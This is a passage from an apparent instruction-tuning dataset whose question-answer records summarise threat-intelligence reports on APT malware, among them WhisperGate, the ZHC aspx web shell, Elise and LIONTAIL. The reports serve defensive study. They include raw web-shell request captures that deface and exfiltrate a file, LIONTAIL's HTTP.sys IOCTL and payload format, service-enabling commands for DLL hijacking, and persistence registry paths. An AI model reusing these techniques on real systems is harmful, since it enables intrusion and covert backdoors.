instances of the exploit\t\n \u00a0code were detected by Virus Total.\n4. CVE-\u00ad\u20102015-\u00ad\u20101770: \"Microsoft\t\n \u00a0Office 2013 SP1 and 2013 RT SP1 allows remote attackers to execute arbitrary code via\t\n \u00a0a\t\n \u00a0crafted Office document, aka\t\n \u00a0\"Microsoft\t\n \u00a0Office Uninitialized Memory Use Vulnerability\" [10]. The vulnerability appears to be in an ActiveX\t\n \u00a0control, according to Microsoft's MS15-\u00ad\u2010059 bulletin [11]. Some likely Italian-\u00ad\u2010based exploitation activity involving the uWarrior Remote Access Trojan was observed in August\t\n \u00a0of 2015 [12] using \t\n \u00a0CVE-\u00ad\u20102015-\u00ad\u20101770 and other older exploit\t\n \u00a0code. Other instances of exploit\t\n \u00a0code have been observed, and the volume is increasing. On Feb 2, 2016 there were only 42 recognized samples of this exploit\t\n \u00a0code found in Virus Total. As of March 30, the number has tripled to 128. Of the observed samples, the first\t\n \u00a0submission\t\n \u00a0was from August\t\n \u00a04, 2015 and the most\t\n \u00a0recent\t\n \u00a0is from March 22, 2016. An exploit\t\n \u00a0apparently for CVE-\u00ad\u20102015-\u00ad\u20101770\t\n \u00a0(plus\t\n \u00a0CVE-\u00ad\u20102015-\u00ad\u20101650) was being sold starting in Mid September 2015 by a\t\n \u00a0group calling themselves \"DaVinci Coders\" that\t\n \u00a0allows the threat\t\n \u00a0actor to embed a\t\n \u00a0binary of their choice inside the Office document\t\n \u00a0that\t\n \u00a0will then be executed when the Office document\t\n \u00a0is opened on an unpatched system. Numerous crafted RTF documents containing author metadata\t\n \u00a0\"Confidential Surfer\" were discovered in September of 2015, and may be connected to this release. While many instances of exploit\t\n \u00a0code hitting CVE-\u00ad\u20102015-\u00ad\u20101170\t\n \u00a0were discovered, underground forum chatter suggests that\t\n \u00a0exploit\t\n \u00a0quality may not\t\n \u00a0always be top-\u00ad\u2010notch. The quality or efficacy of these particular cybercrime-\u00ad\u2010oriented exploits appears to vary, based on the number of times exploitation appeared to fail during analysis.\nQ: Why did the Four Element Sword builder utilize multiple vulnerabilities in the same RTF document, and how does this strategy benefit the threat actors?",
    "output": "The Four Element Sword builder utilized multiple vulnerabilities in the same RTF document to ensure successful exploitation across different targets. Some targets might require newer exploit code due to updated systems, while others with outdated equipment could still be vulnerable to older exploits. This strategy allows the actors to use only the necessary amount of force to achieve their objectives without burning zero-day exploits or advanced techniques unnecessarily. By tailoring the exploits to the target's defenses, the actors maximize their chances of success while conserving resources.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: TECHNICAL DETAILS\nThreat actors have deployed destructive malware, including both WhisperGate and HermeticWiper, against organizations in Ukraine to destroy computer systems and render them inoperable. Listed below are high-level summaries of campaigns employing the malware. CISA recommends organizations review the resources listed below for more in-depth analysis and see the Mitigation section for best practices on handling destructive malware.\nOn January 15, 2022, Microsoft announced the identification of a sophisticated malware operation targeting multiple organizations in Ukraine. The malware, known as WhisperGate, has two stages that corrupts a system's master boot record, displays a fake ransomware note, and encrypts files based on certain file extensions. Note: although a ransomware message is displayed during the attack, Microsoft highlighted that the targeted data is destroyed, and is not recoverable even if a ransom is paid. See Microsoft's blog on for more information and see the IOCs in table 1.\nTable 1: IOCs associated with WhisperGate\nOn February 23, 2022, cybersecurity researchers disclosed that malware known as HermeticWiper was being used against organizations in Ukraine. According to Sentinel Labs, the malware targets Windows devices, manipulating the master boot record and resulting in subsequent boot failure. Note: according to Broadcom, \"[HermeticWiper] has some similarities to the earlier WhisperGate wiper attacks against Ukraine, where the wiper was disguised as ransomware.\" See the following resources for more information and see the IOCs in table 2 below.\n\u2022 ESET Research Tweet:\n\u2022 Sentinel Labs:\n\u2022 Broadcom's Symantec Threat Hunter Team:\nTable 2: IOCs associated with HermeticWiper\nMedium Headline: Best Practices for Handling Destructive Malware\nAs previously noted above, destructive malware can present a direct threat to an organization's daily operations, impacting the availability of critical assets and data. Organizations should increase vigilance and evaluate their capabilities, encompassing planning, preparation, detection, and response, for such an event. This section is focused on the threat of malware using enterprise-scale distributed propagation methods and provides recommended guidance and considerations for an organization to address as part of their network architecture, security baseline, continuous monitoring, and incident response practices.\nCISA and the FBI urge all organizations to implement the following recommendations to increase their cyber resilience against this threat.\nRead the text above and answer this question: How does the WhisperGate malware operate, and what are its primary characteristics? Why is it considered particularly destructive?",
    "output": "WhisperGate operates in two stages. First, it corrupts a system's master boot record, which is crucial for the system to start up properly. Second, it displays a fake ransomware note and encrypts files based on specific file extensions. The malware is considered particularly destructive because, despite displaying a ransomware message, the targeted data is actually destroyed and cannot be recovered even if a ransom is paid. This makes it a significant threat to an organization's operations and data integrity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Very Small Headline: GET /ZHC_Shell_1.0.aspx?action=edit&src=c%3a%5cinetpub%5cwwwroot%5cTEST_FILE.TXT HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\nReferer: http://192.168.1.1/ZHC_Shell_1.0.aspx\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: 192.168.1.1\nConnection: Keep-Alive\nCookie: ASP.NET_SessionId=fqcod255iety0a55x3acuaqe\n---- RESPONSE ----\nHTTP/1.1 200 OK\nServer: Microsoft-IIS/5.1\nDate: Mon, 24 Feb 2014 21:09:48 GMT\nX-Powered-By: ASP.NET\nX-AspNet-Version: 2.0.50727\nCache-Control: private\nContent-Type: text/html; charset=utf-8\nContent-Length: 3555\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<p align=\"center\"><img alt=\"\" title=\"\" src=\"http://img851.imageshack.us/img851/2304/bismillahus.jpg\" /><br />\n</p>\n<div align=\"center\"></div>\n<style type=\"text/css\"> body,td,th { color: #FFFFFF; font-family: Comic Sans Ms;\n}\nbody { background-image: url(\"http://a6.sphotos.ak.fbcdn.net/hphotos-aksnc6/262108_109964339097628_100002521874736_97359_1521760_n.jpg\"); background-position: center center; background-repeat: no-repeat; background-color: #000000; background-attachment: fixed; font-family: Comic Sans MS; font-size: 16px;\n}\na:link { color: #FFFFFF; text-decoration: none;\n} a:visited { text-decoration: none; color: #FFFFFF;\n}\na:hover { text-decoration: none; color: #00FF00;\n}\na:active { text-decoration: none; color: #00FF00;\n}\n.button {color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5}\n.TextBox {border: 1px solid #084B8E}\n.style3 {color: #00FF00}\n.text {font-family: Comic Sans MS; font-size: 18px}\n.title {font-family: Comic Sans MS; font-size: 22px;}\n.footer {font-size: 12px;}\n</style>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html\">\n<title>Aspx Shell By XXx_Death_xXX & ZHC</title>\n</head>\n<body> <form name=\"ctl11\" method=\"post\" action=\"ZHC_Shell_1.0.aspx?action=edit&amp;src=c%3a%5cinetpub%5cwwwroot%5cTEST_FIL\nE.TXT\" id=\"ctl11\" enctype=\"multipart/form-data\">\n<div>\n<input type=\"hidden\" name=\"__EVENTTARGET\" id=\"__EVENTTARGET\" value=\"\" />\n<input type=\"hidden\" name=\"__EVENTARGUMENT\" id=\"__EVENTARGUMENT\" value=\"\" />\n<input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"/wEPDwULLTEzODY2ODE5NzYPZBYCAgsPFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb 3JtLWRhdGFkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYDBQdOZXdGaWxlBQx OZXdEaXJlY3RvcnkFDE5ld0RpcmVjdG9yeVsWlNx5Na0HFMN2RRO+ceR1t+aS\" /> </div>\n<script type=\"text/javascript\">\n//<![CDATA[ var theForm = document.forms['ctl11']; if (!theForm) { theForm = document.ctl11;\n} function __doPostBack(eventTarget, eventArgument) { if (!theForm.onsubmit || (theForm.onsubmit() != false)) { theForm.__EVENTTARGET.value = eventTarget; theForm.__EVENTARGUMENT.value = eventArgument; theForm.submit(); }\n}\n//]]> </script>\n<table width=\"80%\"  border=\"1\" align=\"center\"> <tr> <td width=\"11%\">Path</td>\n<td width=\"89%\"> <input name=\"filepath\" type=\"text\" value=\"c:\\inetpub\\wwwroot\\TEST_FILE.TXT\" id=\"filepath\" class=\"TextBox\" style=\"width:300px;\" />\n*</td>\n</tr>\n<tr>\n<td>Content</td> <td> <textarea name=\"content\" rows=\"25\" cols=\"100\" id=\"content\" class=\"TextBox\">DATA IN\nVery Small Headline: &quot;TEST_FILE.TXT&quot;.</textarea></td>\n</tr> <tr>\n<td></td> <td> <input type=\"submit\" name=\"a\" value=\"Sumbit\" id=\"a\" class=\"button\" />\n</td>\n</tr>\n</table>\n<div>\n.<input type=\"hidden\" name=\"__EVENTVALIDATION\" id=\"__EVENTVALIDATION\" value=\"/wEWBALrm6SaCAKwgsKBDALW4bf/BAK/76ruDDFHkmmcWzwDRZCn6yFg1uYyRvu7\" /> </div></form>\n</p> <script language=\"javascript\"> function closewindow()\n{self.close();}\n</script> <b><p align=\"center\" valign=\"bottom\" class=\"footer\">ZHC Shell 1.0&nbsp;&bull;&nbsp;2011<br/>\nBy XXx_Death_xXX Of <a href=\"http://www.zone-hack.com\" target=\"_blank\" title=\"Welcome to ZHC SHEll\"> ZCompany Hacking Crew</a>&nbsp;&bull;&nbsp;zone-hack.com #ZHC</p></b> </body> </html>\n---- REQUEST ----\nVery Small Headline: POST /ZHC_Shell_1.0.aspx?action=edit&src=c%3a%5cinetpub%5cwwwroot%5cTEST_FILE.TXT HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\nReferer: http://192.168.1.1/ZHC_Shell_1.0.aspx?action=edit&src=c%3a%5cinetpub%5cwwwroot%5cTEST _FILE.TXT\nAccept-Language: en-us\nContent-Type: multipart/form-data; boundary=---------------------------7de26c3b270192\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: 192.168.1.1\nContent-Length: 1096\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: ASP.NET_SessionId=fqcod255iety0a55x3acuaqe\n---------------------------------------- TRUNCATED BY ANALYST --------------------------------------------------\n-----------------------------7de26c3b270192\nContent-Disposition: form-data; name=\"__EVENTTARGET\"\n-----------------------------7de26c3b270192\nContent-Disposition: form-data; name=\"__EVENTARGUMENT\"\n-----------------------------7de26c3b270192\nContent-Disposition: form-data; name=\"__VIEWSTATE\"\n/wEPDwULLTEzODY2ODE5NzYPZBYCAgsPFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb3JtLW RhdGFkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYDBQdOZXdGaWxlBQxOZXd EaXJlY3RvcnkFDE5ld0RpcmVjdG9yeVsWlNx5Na0HFMN2RRO+ceR1t+aS\n-----------------------------7de26c3b270192\nfilepath\nContent-Disposition: form-data; name=\"\"\nc:\\inetpub\\wwwroot\\TEST_FILE.TXT\n-----------------------------7de26c3b270192\ncontent\nContent-Disposition: form-data; name=\"\"\nVery Small Headline: Hacked by STTEAM!\n-----------------------------7de26c3b270192\nContent-Disposition: form-data; name=\"a\"\nSumbit\n-----------------------------7de26c3b270192\nContent-Disposition: form-data; name=\"__EVENTVALIDATION\"\n/wEWBALrm6SaCAKwgsKBDALW4bf/BAK/76ruDDFHkmmcWzwDRZCn6yFg1uYyRvu7 -----------------------------7de26c3b270192--\n---- RESPONSE ----\nHTTP/1.1 200 OK\nServer: Microsoft-IIS/5.1\nDate: Mon, 24 Feb 2014 21:09:59 GMT\nX-Powered-By: ASP.NET\nX-AspNet-Version: 2.0.50727\nCache-Control: private\nContent-Type: text/html; charset=utf-8\nContent-Length: 3749\n<script>alert('Edit|Creat c:\\\\inetpub\\\\wwwroot\\\\TEST_FILE.TXT\nSuccess!');location.href='/ZHC_Shell_1.0.aspx?action=goto&src=c%3a%5cinetpub%5cwwwroot% 5c'</script>\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<p align=\"center\"><img alt=\"\" title=\"\" src=\"http://img851.imageshack.us/img851/2304/bismillahus.jpg\" /><br />\n</p>\n---------------------------------------- TRUNCATED BY ANALYST --------------------------------------------------\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html\">\n<title>Aspx Shell By XXx_Death_xXX & ZHC</title>\n</head>\n<body>\n<form name=\"ctl11\" method=\"post\" action=\"ZHC_Shell_1.0.aspx?action=edit&amp;src=c%3a%5cinetpub%5cwwwroot%5cTEST_FIL E.TXT\" id=\"ctl11\" enctype=\"multipart/form-data\">\n<div>\n<input type=\"hidden\" name=\"__EVENTTARGET\" id=\"__EVENTTARGET\" value=\"\" />\n<input type=\"hidden\" name=\"__EVENTARGUMENT\" id=\"__EVENTARGUMENT\" value=\"\" />\n<input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"/wEPDwULLTEzODY2ODE5NzYPZBYCAgsPFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb 3JtLWRhdGFkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYEBQdOZXdGaWxlBQd OZXdGaWxlBQxOZXdEaXJlY3RvcnkFDE5ld0RpcmVjdG9yecjgjhjkSsSPowbSdyPqLK8RvfwA\" />\n</div>\n<script type=\"text/javascript\">\n//<![CDATA[ var theForm = document.forms['ctl11']; if (!theForm) { theForm = document.ctl11;\nVery Small Headline: Hacked by STTEAM!</textarea></td>\n</tr>\n<tr>\n<td></td>\n<td> <input type=\"submit\" name=\"a\" value=\"Sumbit\" id=\"a\" class=\"button\" />\n</td>\n</tr>\n</table>\n<div>\n.<input type=\"hidden\" name=\"__EVENTVALIDATION\" id=\"__EVENTVALIDATION\" value=\"/wEWBAKVzdKBCwKwgsKBDALW4bf/BAK/76ruDA40iO6cLOK3TeAbqxG5L91EeqiK\" /> </div></form>\n</p>\n<script language=\"javascript\"> function closewindow()\n{self.close();}\n</script>\n<b><p align=\"center\" valign=\"bottom\" class=\"footer\">ZHC Shell 1.0&nbsp;&bull;&nbsp;2011<br/> By XXx_Death_xXX Of <a href=\"http://www.zone-hack.com\" target=\"_blank\" title=\"Welcome to ZHC SHEll\"> ZCompany Hacking Crew</a>&nbsp;&bull;&nbsp;zone-hack.com #ZHC</p></b> </body>\n---------------------------------------- TRUNCATED BY ANALYST --------------------------------------------------\nThe following window was displayed during this operation:\n- \"File Downloaded\" from Victim system into the attacker's system Filename: \"TEST_FILE.txt\"\n\nHow does the 'K-Shell/ZHC Shell 1.0/Aspx Shell' backdoor facilitate file manipulation, and what specific actions can an attacker perform using this functionality?",
    "output": "The 'K-Shell/ZHC Shell 1.0/Aspx Shell' backdoor facilitates file manipulation by allowing the attacker to interact with files on the compromised system through a web interface. Specific actions that an attacker can perform include uploading, downloading, copying, deleting, modifying, and searching for files. For example, the attacker can edit a file located at 'c:\\\\inetpub\\\\wwwroot\\\\TEST_FILE.TXT' by submitting a form with the new content. This is evident from the request and response data provided, where the attacker successfully edits the file and receives a confirmation message.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What key lessons can be learned from the reported APT attacks regarding the role of human factors and the protection of sensitive information by technology companies? How can this knowledge be applied to enhance security measures?",
    "output": "Key lessons from reported APT attacks highlight that humans are often the weakest link in the security chain, and users need to be better educated on the threat from social engineering. Socially engineered email campaigns are the most common technique used but not the only one. Additionally, technology companies need to be better prepared to protect sensitive information that can be used to negatively affect the security of their customers and business partners. This includes safeguarding information that could undermine security measures put in place. To enhance security measures, organizations should focus on educating employees about social engineering techniques and implementing robust security protocols to protect sensitive information. This can involve regular training sessions, advanced email filtering systems, and stringent access controls to minimize the risk of successful APT attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Elise malware, particularly Variant A, ensure persistence on the infected system? Describe the methods used and any notable techniques.",
    "output": "Variant A of the Elise malware ensures persistence through several methods. First, it configures itself for deletion upon reboot using the MoveFileExA function. It then extracts and decrypts an embedded DLL to the location '%APPDATA%\\\\Microsoft\\\\Network\\\\mssrt32.dll'. If the installation of this DLL as a service fails, the malware writes an executable to '%APPDATA%\\\\Microsoft\\\\Network\\\\svchost.exe' and sets persistence via the registry key 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\svchost'. Finally, it runs the executable using the ShellExecuteW function. These methods ensure that the malware remains active even after a system reboot.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: LIONTAIL Framework\nLIONTAIL is a malware framework that includes a set of custom shellcode loaders and memory resident shellcode payloads. One of its components is the LIONTAIL backdoor, written in C. It is a lightweight but rather sophisticated passive backdoor installed on Windows servers that enables attackers to execute commands remotely through HTTP requests. The backdoor sets up listeners for the list of URLs provided in its configuration and executes payloads from requests sent by attackers to those URLs.\nThe LIONTAIL backdoor components are the main implants utilized in the latest Scarred Manticore intrusions. Utilizing access from a publicly facing server, the threat actor chains a set of passive implants to access internal resources. The internal instances of the LIONTAIL\nbackdoors we've seen so far either listen on HTTP(s), similar to the internet-facing instances, or in some cases use named pipes to facilitate remote code execution.\nMedium Headline: Installation\nWe observed 2 methods of backdoor installation on the compromised Windows servers: standalone executables, and DLLs loaded through search order hijacking by Windows services or legitimate processes.\nWhen installed as a DLL, the malware exploits the absence of some DLLs on Windows Server OS distributions: the backdoor is dropped to the system\nfolder C:\\windows\\system32 as wlanapi.dll or wlbsctrl.dll. By default, neither of these exist on Windows Server installations. Depending on the Windows Server version, the malicious DLL is then loaded either directly by other processes, such as Explorer.exe, or the threat actors enable specific services, disabled by default, that require those DLLs.\nIn the case of wlbsctrl.dll, the DLL is loaded at the start of the IKE and AuthIP IPsec Keying Modules service. For wlanapi.dll, the actors enable Extensible Authentication Protocol:\nsc.exe config Eaphost start=auto sc.exe start Eaphost\nIn instances where LIONTAIL is deployed as an executable, a noteworthy characteristic observed in some is the attempt to disguise the executable as Cyvera Console, a component of Cortex XDR.\nMedium Headline: Configuration\nThe malware starts by performing a one-byte XOR decryption of a structure containing the malware configuration, which is represented with the following structure:\nQWORD var_0\nQWORD var_8\nQWORD magic_number\nDWORD num_of_end_string\nDWORD num_of_listen_urls\nSTRING end_string\nSTRING[] listen_urls\nThe field listen_urls defines particular (<https://learn.microsoft.com/en-us/windows/win32/http/urlprefix-strings>)URL prefixes to which the malware listens for incoming requests.\nAll of the samples' URL lists include the http://+:80/Temporary_Listen_Addresses/ URL prefix, a default that allows any user to receive messages from this URL. Other samples include multiple URLs on ports 80, 443, and 444 (on Exchange servers) mimicking existing services, such as:\nhttps://+:443/autodiscover/autodiscovers/\nhttps://+:443/ews/exchanges/ https://+:444/ews/ews/\nMany LIONTAIL samples contain tailor-made configurations, which add multiple other custom URLs that match existing web folders on the compromised server. As the URLs for the existing folders are already taken by the actual IIS service, the generated payloads contain additional random dictionary words in the path. These ensure the malware communication blends into legitimate traffic, helping to make it more inconspicuous.\nThe host element of all prefixes in the configuration consists of a single plus sign (+), a \"strong wildcard\" that matches all possible host names. A strong wildcard is useful when an application needs to serve requests addressed to one or more relative URLs, regardless of how those requests arrive on the machine or what site (host or IP address) they specify in their Host headers.\nTo understand how the malware configures listeners on those prefixes and how the approach changes with time, we pause for a short introduction to the Windows HTTP stack.\nMedium Headline: Windows HTTP Stack components\nA port-sharing mechanism, which allows multiple HTTP services to share the same TCP port and IP address, was introduced in Windows Server 2003. This mechanism is encapsulated within HTTP.sys, a kernel-mode driver that assumes the responsibility of processing HTTP requests, listens to incoming HTTP requests, and directs them to the relevant user-mode processes or services for further handling.\nOn top of the driver layer, Windows provides the , a user-mode component that provides the interface for interacting with HTTP.sys. In addition, the Internet Information Services (IIS) under the hood relies on HTTP API to interact with the HTTP.sys driver. In a similar fashion, the (<https://learn.microsoft.com/en-us/dotnet/api/system.net.httplistener?view=net-8.0>)HttpListener class within the .NET framework is a simple wrapper around the HTTP Server API.\nFigure 2 \u2013 Schema of HTTP stack components on Windows Servers ().\nThe process of receiving and processing requests for specific URL prefixes by an application (or, in our case, malware) can be outlined as follows:\n1. The malware registers one or more URL prefixes with HTTP.sys by any of the means provided by the Windows operating system.\n2. When an HTTP request is received, HTTP.sys identifies the application associated with the request's prefix and forwards the request to the malware if it's responsible for that prefix.\n3. The malware's request handler then receives the request intercepted by HTTP.sys and generates a response for it.\nMedium Headline: C&C Communication\nAfter extracting the configuration, the malware uses the same one-byte XOR to decrypt a shellcode responsible for establishing the C&C communication channel by listening to the provided URL prefixes list. While the concept of passive backdoors on web-facing Windows servers is not new and was in the wild hijacking the same Windows DLL wblsctrl.dll as early as 2019 (by Chinese-linked (<https://securelist.com/operation-shadowhammer/89992/>)Operation ShadowHammer), the\nLIONTAIL developers elevated their approach. Instead of using the HTTP API, the malware uses IOCTLs to interact directly with the underlying HTTP.sys driver. This approach is stealthier as it doesn't involve IIS or HTTP API, which are usually closely monitored by security solutions, but is not a straightforward task given that the IOCTLs for HTTP.sys are undocumented and require additional research efforts by the threat actors.\nFirst, the shellcode registers the URL prefixes with HTTP.sys using the following IOCTLs:\n0x128000 \u2013 UlCreateServerSessionIoctl \u2013 Creates an HTTP/2.0 session.\n0x128010 \u2013 UlCreateUrlGroupIoctl \u2013 Creates a new UrlGroup. UrlGroups are configuration containers for a set of URLs created under the server session and inherit its configuration settings.\n0x12801d \u2013 UlSetUrlGroupIoctl \u2013 Associates the UrlGroup with the request queue by setting HttpServerBindingProperty.\n0x128020 \u2013 UlAddUrlToUrlGroupIoctl \u2013 Adds the array of listen_urls to the newly created UrlGroup.\nAfter registering the URL prefixes, the backdoor initiates a loop responsible for handling the incoming requests. The loop continues until it gets the request from a URL equal to the end_string provided in the backdoor's configuration.\nThe backdoor receives requests from HTTP.sys using 0x124036 \u2013\nUlReceiveHttpRequestIoctl IOCTL.\nDepending on the version of the compromised server, the body of the request is received using 0x12403B \u2013 UlReceiveEntityBodyIoctl or (if higher than 20348) 0x12403A \u2013 UlReceiveEntityBodyFastIo. It is then base64-decoded and decrypted by XORing the whole data with the first byte of the data. This is a common method of encryption observed in (<https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-264a>)multiple malware families, including but not limited to DEV-0861's web-deployed Reverse proxy.\nThe decrypted payload has the following structure:\nQWORD shellcode_size\n_BYTE[] shellcode\nQWORD shellcode_output (should be 0 in the incoming msg)\nQWORD shellcode_output_size (should be 0 in the incoming msg)\nQWORD MAGIC_NUM (has to be 0x18)\n_BYTE[] argument\nThe malware creates a new thread and runs the shellcode in memory. For some reason, it uses shellcode_output and shellcode_output_size in the request message as pointers to the respective data in memory.\nTo encrypt the response, the malware chooses a random byte, XOR-encodes the data using it as a key, prepends the key to the result, and then base64-encodes the entire result before sending it back to the C&C server using the IOCTL 0x12403F \u2013 UlSendHttpResponseIoctl.\nMedium Headline: LIONTAIL web shell\nIn addition to PE implant, Scarred Manticore uses a web shell-based version of the LIONTAIL shellcode loader. The web shell is obfuscated in a similar manner to other Scarred Manticore .NET payloads and web shells.\nThe web shell gets requests with 2 parameters:\nThe shellcode to execute.\nThe argument for the shellcode to use.\nBoth parameters are encrypted the same way as other communication: XOR with the first byte followed by base64 encoding.\nThe structure of shellcodes and of arguments sent to the web shell-based shellcode loader is identical to those used in the LIONTAIL backdoor, which suggests that the artifacts observed are part of a bigger framework that allows the dynamic building of loaders and payloads depending on the actor's access and needs.\nQuestion: What is the role of the LIONTAIL web shell in Scarred Manticore's operations, and how does it relate to the overall LIONTAIL framework?",
    "output": "Answer: The LIONTAIL web shell serves as an alternative method for executing shellcode, complementing the PE implant used by Scarred Manticore. The web shell is obfuscated similarly to other Scarred Manticore .NET payloads and web shells. It receives requests with two parameters: the shellcode to execute and the argument for the shellcode. Both parameters are encrypted using XOR with the first byte followed by base64 encoding, mirroring the encryption method used in other LIONTAIL communications. The structure of shellcodes and arguments sent to the web shell is identical to those used in the LIONTAIL backdoor, indicating that these artifacts are part of a larger framework. This framework allows dynamic building of loaders and payloads based on the actor's access and needs, providing flexibility and adaptability in their operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ANALYSIS\nAs stated in the blog, the attacks are suspected of originating from the website of the Polish Financial Supervision Authority (knf.gov[.]pl), shown below:\nFrom at least 2016-10-07 to late January the website code had been modified to cause visitors to download malicious JavaScript files from the following locations:\nhxxp://sap.misapor[.]ch/vishop/view.jsp?pagenum=1 hxxps://www.eye-watch[.]in/design/fancybox/Pnf.action\nBoth of these appear to be compromised domains given they are also hosting legitimate content and have done for some time. The malicious JavaScript leads to the download of malware to the victim's device.\nSome hashes of the backdoor have been provided in BadCyber's technical analysis:\n85d316590edfb4212049c4490db08c4b\nc1364bbf63b3617b25b58209e4529d8c\n1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae\nThe C&Cs given in the BadCyber analysis were the following IP addresses:\n125.214.195.17\n196.29.166.218\nBig Headline: LAZARUS MALWARE\nOnly one of the samples referenced by BadCyber is available in public malware repositories. At the moment we cannot verify that it originated from the watering-hole on the KNF website \u2013 but we have no reason to doubt this either.\nThe file is packed with a commercial packer known as (<http://enigmaprotector.com/en/about.html>)'Enigma Protector'. Once unpacked it drops a known malware variant, which has been seen as part of the Lazarus group's toolkit in other cases over the past year.\nThe unpacked executable takes several command line arguments:\n- l: list service names, available for its own registration\n- o: open specified event\n- t: set specified event\n-x [PASSWORD] -e [SERVICE_NAME]: drop/install DLL under specified [SERVICE_NAME]\n-x [PASSWORD] -f [SERVICE_NAME]: recreate the keys that keep the password for the next stage DLL, under the specified [SERVICE_NAME]\nThe provided password's MD5 hash is used as an RC4 password. On top of that, there is one more RC4-round, using a hard coded 32-byte RC4 password:\n53 87 F2 11 30 3D B5 52 AD C8 28 09 E0 52 60 D0 6C C5 68 E2 70 77 3C 8F 12 C0 7B 13 D7 B3 9F 15\nOnce the data is decrypted with two RC4 rounds, the dropper checks the decrypted data contains a valid 4-byte signature: 0xBC0F1DAD.\nBig Headline: WATERING HOLE ANALYSIS\nThe attacker content on the compromised sap.misapor[.]ch site was not accessible at the time of writing. However, archived versions of some pages can be found:\nhttp://web.archive[.]org/web/20170203175640/https://sap.misapor.ch/Default.html http://web.archive[.]org/web/20170203175641/https://sap.misapor.ch/Silverlight.js\nThe Default.html contains code to load MisaporPortalUI.xap \u2013 a Silverlight application which likely would contain the malicious first-stage implant. This is unfortunately not available for analysis currently.\n<div id=\"silverlightControlHost\"> <object data=\"data:application/x-silverlight,\" type=\"application/x-silverlight-2\" width=\"100%\" height=\"100%\"> <param name=\"source\" value=\"ClientBin/MisaporPortalUI.xap?ver=1.0.7.0\"/> <param name=\"onerror\" value=\"onSilverlightError\" /> <param name=\"background\" value=\"white\" /> <param name=\"minRuntimeVersion\" value=\"3.0.40624.0\" /> <param name=\"autoUpgrade\" value=\"true\" /> <a href=\"/web/20170203175640/http://go.microsoft.com/fwlink/? LinkID=149156&v=3.0.40624.0\" style=\"text-decoration: none;\"> <img src=\"/web/20170203175640im_/http://go.microsoft.com/fwlink/?LinkId=108181\" alt=\"Get Microsoft Silverlight\" style=\"border-style: none\"/> </a> </object> <iframe id='_sl_historyFrame' style='visibility:hidden;height:0;width:0;border:0px'>\n</iframe>\n</div>\nBig Headline: ADDITIONAL WATERING HOLES\nThe eye-watch[.]in domain appears to have been used in watering-hole attacks on other financial sector websites. On 2016-11-08 we observed connections to the site referred from:\nhxxp://www.cnbv.gob[.]mx/Prensa/Paginas/Sanciones.aspx\nThis is the page for the Comisi\u00f3n Nacional Bancaria y de Valores (National Banking and Stock Commission of Mexico), specifically the portion of their site that details sanctions made by the Mexican National Banking Commission. This organisation is the Mexican banking supervisor and the equivalent of Poland's KNF.\nIn this instance the site redirected to the following URL:\nhxxp://www.eye-watch[.]in/jscroll/images/images.jsp?pagenum=1\nAt the time of writing the compromise is no longer present and no archived versions of the page exist to show where the compromise was located.\nA further instance of the malicious code appears to have been present on a bank website in Uruguay around 2016-10-26 when a PCAP of browsing to the website was (<https://virustotal.com/en/file/a9f2b6a2fa1f0da4c35237638cfb0c6f988e74ee5a912ce727981a48435eddfa/analysis/>)uploaded to VirusTotal.com.\nThis shows a GET request made to:\nhxxp://brou.com[.]uy\nFollowed shortly after by connections to:\nwww.eye-watch[.]in:443\nUnfortunately, the response was empty and it is not possible to assess what may have been delivered.\nBig Headline: ADDITIONAL MALWARE AND EXPLOIT ACTIVITY\nThe compromised eye-watch[.]in domain has been associated with other malicious activity in recent months. Below is a list of samples which have used the site:\nThe last 4 samples can loosely be categorised as the same malware variant, however the first sample appears to be a separate exploit (as detailed later).\nIt is worth noting that these samples were all compiled after the domain began being used alongside the knf.gov[.]pl watering-hole. Additionally, the samples uploaded from Poland and 